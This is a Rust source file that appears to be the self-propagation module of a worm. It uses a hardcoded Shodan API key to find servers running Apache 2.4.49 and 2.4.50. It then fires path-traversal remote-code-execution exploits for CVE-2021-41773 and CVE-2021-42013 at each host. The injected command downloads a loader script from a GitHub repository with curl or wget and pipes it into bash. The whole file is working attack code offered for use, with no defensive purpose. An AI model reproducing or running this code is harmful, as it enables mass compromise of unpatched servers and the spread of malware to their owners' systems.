mod http;

use crate::shodan::Shodan;

use log::{info, warn};

use std::process::Command;
use std::net::Ipv4Addr;

const PAYLOAD: &'static str = "(curl -kL https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh || wget -q --no-check-certificate -O- https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh ) | bash";


pub struct Exploit {
    query: String,
    command: fn(String) -> Vec<String>,
}

pub struct Propogate {
    shodan: Shodan,
    exploits: Vec<Exploit>,
}

impl Propogate {
    pub fn new() -> Propogate {
        Propogate {
            shodan: Shodan::new("7XRdrUMb9i2N6P6rqyXIM3PyDGBl6Wyg"),
            exploits: Vec::new(),
        }
    }

    pub fn add(&mut self, query: &str, command: fn(String) -> Vec<String>) {
        self.exploits.push(Exploit {
            query: query.to_string(),
            command,
        });
    }

    pub fn run(&mut self) {
        for exploit in self.exploits.iter() {
            let mut page = 1;

            info!("searching for vulnerable {} servers", exploit.query);

            while let Some(search) = self.shodan.search(&exploit.query, &mut page) {
                info!("shodan searching {} hosts, page {}/{}", search.total, page, search.total / 100);

                for host in search.hosts {
                    let ip = Ipv4Addr::from_bits(host.ip);

                    info!("sending to host: {}", ip);

                    if let Err(err) = Command::new("curl").args((exploit.command)(ip.to_string())).output() {
                        warn!("failed to run command: {:?}", err);
                    }
                }

                page += 1;
            }
        }
    }
}

pub fn run() {
    let mut propogate = Propogate::new();

    // maybe we can just use lazyscan if we just replace the module payload with our own?

    // https://nvd.nist.gov/vuln/detail/CVE-2021-41773

    propogate.add("apache 2.4.49", |host| vec![
        String::from("-d" ),
        String::from("echo Content-Type: text/plain; echo; (curl -kL https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh || wget -q --no-check-certificate -O- https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh ) | bash"),
        format!("{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh", host),
    ]);

    // https://nvd.nist.gov/vuln/detail/CVE-2021-42013

    propogate.add("apache 2.4.50", |host| vec![
        String::from("-d"),
        String::from("echo Content-Type: text/plain; echo; (curl -kL https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh || wget -q --no-check-certificate -O- https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh ) | bash"),
         format!("{}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh", host),
    ]);

    propogate.run()
}


